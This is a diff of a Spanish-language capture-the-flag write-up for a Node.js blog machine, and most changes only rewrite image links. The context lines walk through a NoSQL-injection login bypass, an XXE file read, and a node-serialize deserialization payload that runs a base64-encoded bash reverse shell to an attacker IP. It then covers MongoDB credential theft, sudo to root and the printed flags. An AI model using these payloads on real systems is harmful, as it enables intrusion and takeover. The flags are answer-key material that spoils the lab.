@@ -1,5 +1,5 @@
 
-![[20250723110122.png]]
+![[20250723110122.png]](nodeblog-images/20250723110122.png)
 
 # Fase de Reconocimiento
 
@@ -9,7 +9,7 @@ hacemos un escaneo básico de puertos con nmap
 nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.96.160 -oG allPorts
 ```
 
-![[20250723110306.png]]
+![[20250723110306.png]](nodeblog-images/20250723110306.png)
 
 una vez sabemos los puertos abiertos haremos un segundo escaneo con scripts basicos de nmap para sacar el servicio y la version que corren por detras
 
@@ -18,32 +18,32 @@ una vez sabemos los puertos abiertos haremos un segundo escaneo con scripts basi
 nmap -p22,5000 -sCV 10.129.96.160 -oN targeted
 ```
 
-![[20250723110436.png]]
+![[20250723110436.png]](nodeblog-images/20250723110436.png)
 
 vemos que en el puerto 5000 hay un http y la versión es Node.js
 
 ## Explorando http
 
-![[20250723110602.png]]
+![[20250723110602.png]](nodeblog-images/20250723110602.png)
 
 vemos este menú donde nos dejan ingresar a la pagina
 
 al pulsar en Login nos piden credenciales de acceso que no sabemos
-![[20250723110641.png]]
+![[20250723110641.png]](nodeblog-images/20250723110641.png)
 
 probamos a meter cualquier cosa
 
-![[20250723110708.png]]
+![[20250723110708.png]](nodeblog-images/20250723110708.png)
 
 pruebo típicas credenciales de acceso 
 
-![[20250723110729.png]]
+![[20250723110729.png]](nodeblog-images/20250723110729.png)
 
 podemos ver que dice invalid password quiero pensar que el usuario es correcto entonces. para comprobarlo vamos a poner credenciales   diferentes
 
 asd:admin123
 
-![[20250723110826.png]]
+![[20250723110826.png]](nodeblog-images/20250723110826.png)
 
 efectivamente ahora me dice que el usuario es invalido por lo que admin es un usuario existente en el sistema 
 
@@ -51,11 +51,11 @@ efectivamente ahora me dice que el usuario es invalido por lo que admin es un us
 
 Lo primero que hay que hacer es romper ese panel de Login así que vamos a probar con inyecciones SQL. Adelanto que por inyecciones de SQL no sacamos nada por lo que busque en payloadsAllTheThings para ver algo que no estoy contemplando.
 
-![[20250723111326.png]]
+![[20250723111326.png]](nodeblog-images/20250723111326.png)
 
 vemos este apartado de NoSQL Injection que no he probado así que seguimos investigando 
 
-![[20250723111455.png]]
+![[20250723111455.png]](nodeblog-images/20250723111455.png)
 
 aqui vemos que podemos tratar de hacerlo por HTTP data o por JSON data asi que vamos a probar 
 
@@ -64,12 +64,12 @@ aqui vemos que podemos tratar de hacerlo por HTTP data o por JSON data asi que v
 interceptamos la petición de Login con burpsuite y lo mandamos al repeater
 
 
-![[20250723111638.png]]
+![[20250723111638.png]](nodeblog-images/20250723111638.png)
 
 por http data no conseguimos nada asi que vamos a probar con json
 
 
-![[20250723111747.png]]
+![[20250723111747.png]](nodeblog-images/20250723111747.png)
 
 esta sera la peticion en formato json como hasta ahora nos estaba interpretando esto `Content-Type: application/x-www-form-urlencoded` tenemos que cambiarlo por `Content-Type: application/json` para que nos interprete el json
 
@@ -88,7 +88,7 @@ y en la parte de la contraseña le decimos que no es admin tratando de confundir
 
 
 
-![[20250723112110.png]]
+![[20250723112110.png]](nodeblog-images/20250723112110.png)
 
 al enviar la petición vemos que nos genera una cookie de sesion por lo que parece que es funcional.
 
@@ -96,7 +96,7 @@ vamos a tratar de hacerlo directamente en el panel de login
 
 interceptamos una nueva petición
 
-![[20250723112251.png]]
+![[20250723112251.png]](nodeblog-images/20250723112251.png)
 
 cambiamos el cuerpo de la peticion de esto:
 
@@ -146,19 +146,19 @@ Priority: u=0, i
 
 y pulsamos en Forward para dejar que la petición continúe ya que la tenemos interceptada
 
-![[20250723112504.png]]
+![[20250723112504.png]](nodeblog-images/20250723112504.png)
 
 Hemos conseguido acceso a la pagina web. ahora tenemos que encontrar la manera de vulnerarla para conseguir una shell
 
-![[20250723112755.png]]
+![[20250723112755.png]](nodeblog-images/20250723112755.png)
 
 creamos un archivo tipo texto de prueba para ver si nos permite subirlo a la pagina
 
-![[20250723112830.png]]
+![[20250723112830.png]](nodeblog-images/20250723112830.png)
 
 nos dice que debe ser un XML pulsamos Ctrl + U para ver como debe ser el contenido del XML 
 
-![[20250723112903.png]]
+![[20250723112903.png]](nodeblog-images/20250723112903.png)
 
 vemos esto
 
@@ -166,22 +166,24 @@ vemos esto
 <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
 ```
 
-![[20250723113050.png]]
+![[20250723113050.png]](nodeblog-images/20250723113050.png)
 
 creamos con nano un archivo xml de prueba y probamos a subirlo a la pagina web
 
-![[20250723113133.png]]
+![[20250723113133.png]](nodeblog-images/20250723113133.png)
 
 aparece esto por lo que parece que esta interpretando el archivo que hemos subido puede ser que se acontezca un XXE asi que volvemos a payloadsAllTheThings 
 a buscar informacion del ataque
 
 ## XXE INJECTION
 
-![[20250723113251.png]]![[20250723113350.png]]
+![[20250723113251.png]](nodeblog-images/20250723113251.png)
+
+![[20250723113350.png]](nodeblog-images/20250723113350.png)
 
 vamos a probar esto, modificamos el archivo que hemos creado "test.xml"
 
-![[20250723113511.png]]
+![[20250723113511.png]](nodeblog-images/20250723113511.png)
 
 quedaría  así 
 
@@ -204,7 +206,7 @@ quedaría  así
 
 vemos que no funciona así que probaremos otro
 
-![[20250723113939.png]]
+![[20250723113939.png]](nodeblog-images/20250723113939.png)
 
 este quedaría así 
 
@@ -225,7 +227,7 @@ este quedaría así
 </post>
 ```
 
-![[20250723114027.png]]
+![[20250723114027.png]](nodeblog-images/20250723114027.png)
 
 ahora si que lo esta interpretando.
 
@@ -233,11 +235,11 @@ tras probar a revisar varios archivos en el sistema no vemos nada interesante qu
 
 vamos a tratar de romper la pagina web para que de algún tipo de fallo y nos de informacion sobre la pagina 
 
-![[20250723114452.png]]
+![[20250723114452.png]](nodeblog-images/20250723114452.png)
 
 ponemos paréntesis aleatorios en la parte de la password por ejemplo a ver que sucede
 
-![[20250723114528.png]]
+![[20250723114528.png]](nodeblog-images/20250723114528.png)
 
 y vemos en la respuesta un error que nos muestra el directorio /opt/blog donde podemos pensar que esta almacenada toda la data de la web
 
@@ -275,7 +277,7 @@ por:
 <!ENTITY xxe SYSTEM "file:///opt/blog/server.js" >]>
 ```
 
-![[20250723114931.png]]
+![[20250723114931.png]](nodeblog-images/20250723114931.png)
 
 vemos que si que existe este archivo en el sistema y confirmamos que la pagina web se almacena en /opt/blog
 
@@ -291,17 +293,17 @@ ponemos en burpsuite en el decoder esto
 y lo codificamos en URL
 
 
-![[20250723130302.png]]
+![[20250723130302.png]](nodeblog-images/20250723130302.png)
 
-![[20250723130308.png]]
+![[20250723130308.png]](nodeblog-images/20250723130308.png)
 
 nos copiamos todo el texto codificado y vamos a la raíz de la pagina web
 
-![[20250723130335.png]]
+![[20250723130335.png]](nodeblog-images/20250723130335.png)
 
 una vez aqui vamos a a pulsar f12 para ver el almacenamiento de cookies
 
-![[20250723130405.png]]
+![[20250723130405.png]](nodeblog-images/20250723130405.png)
 
 cambiamos "Value" por el URL codificado
 
@@ -313,7 +315,7 @@ tcpdump -i tun0 icmp -n
 
 refrescamos la pagina web y tenemos conexión, hemos recibido el ping
 
-![[20250723130511.png]]
+![[20250723130511.png]](nodeblog-images/20250723130511.png)
 
 ## Reverse shell
 
@@ -369,13 +371,13 @@ Para que esto lo interprete la IP VICTIMA en la pagina web tenemos que ponerlo e
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42NC80NDMgMD4mMQo= |base64 -d |bash',function(error, stdout, stderr){ console.log(stdout)});}()"}
 ```
 
-![[20250724094919.png]]
+![[20250724094919.png]](nodeblog-images/20250724094919.png)
 
-![[20250724094929.png]]
+![[20250724094929.png]](nodeblog-images/20250724094929.png)
 
 esto lo pegaremos en la pagina index.txt pulsando F12 y cambiando el valor de la cookie
 
-![[20250724095020.png]]
+![[20250724095020.png]](nodeblog-images/20250724095020.png)
 en nuestra terminal nos ponemos en escucha por el puerto 443 
 
 
@@ -385,7 +387,7 @@ nc -nlvp 443
 
 y pulsamos F5 en la pagina de la IP VICTIMA  para actualizarla y que se ejecute el ataque
 
-![[20250724095138.png]]
+![[20250724095138.png]](nodeblog-images/20250724095138.png)
 
 recibiremos una Shell
 
@@ -417,7 +419,7 @@ export SHELL=/bin/bash
 
 lo primero que miramos siempre es sudo -l para ver si tenemos opción de ejecutar algo como root
 
-![[20250724095630.png]]
+![[20250724095630.png]](nodeblog-images/20250724095630.png)
 
 me pide contraseña y yo no me la se
 
@@ -429,13 +431,13 @@ netstat -nat
 
 podemos ver los puertos abiertos internos de la maquina ya que con nmap solo tenemos acceso a los puertos abiertos de forma externa
 
-![[20250724095832.png]]
+![[20250724095832.png]](nodeblog-images/20250724095832.png)
 
 el puerto 27017 nos interesa por que buscando en Google vemos que esta relacionado con la base de datos MongoDB por lo que igual podemos conseguir algo por ahi
 
 Pongo en la consola "mongo" para tratar de conectarme a la base de datos y efectivamente nos podemos conectar sin problemas
 
-![[20250724100014.png]]
+![[20250724100014.png]](nodeblog-images/20250724100014.png)
 
 poniendo el comando 
 ```bash
@@ -444,15 +446,15 @@ help
 
 nos dará informacion de lo que podemos hacer
 
-![[20250724100054.png]]
+![[20250724100054.png]](nodeblog-images/20250724100054.png)
 
 empecemos a investigar
 
-![[20250724100128.png]]
+![[20250724100128.png]](nodeblog-images/20250724100128.png)
 
 aqui vemos varias bases de datos. después de estar explorando un poco os muestro la ruta a seguir para llegar a la contraseña
 
-![[20250724100432.png]]
+![[20250724100432.png]](nodeblog-images/20250724100432.png)
 
 ```bash
 show dbs
@@ -477,7 +479,7 @@ nos salimos de la base de datos poniendo "exit"
 
 y probamos sudo -l con la contraseña
 
-![[20250724100637.png]]
+![[20250724100637.png]](nodeblog-images/20250724100637.png)
 ahora si tenemos acceso y vemos que podemos ejecutar cualquier comando como root desde cualquier usuario
 
 así que ponemos :
@@ -486,7 +488,7 @@ así que ponemos :
 sudo su
 ```
 
-![[20250724100748.png]]
+![[20250724100748.png]](nodeblog-images/20250724100748.png)
 
 y tenemos acceso como root
 
@@ -499,7 +501,7 @@ en el directorio: /home/admin
 
 user: a117912dee418d6ba43f910e5d5d8d95
 
-![[20250724100850.png]]
+![[20250724100850.png]](nodeblog-images/20250724100850.png)
 
 ## root
 
@@ -507,4 +509,4 @@ en el directorio: /root
 
 root : 6f4c97d91aa14ff42e7955d220e52541
 
-![[20250724100945.png]]
+![[20250724100945.png]](nodeblog-images/20250724100945.png)
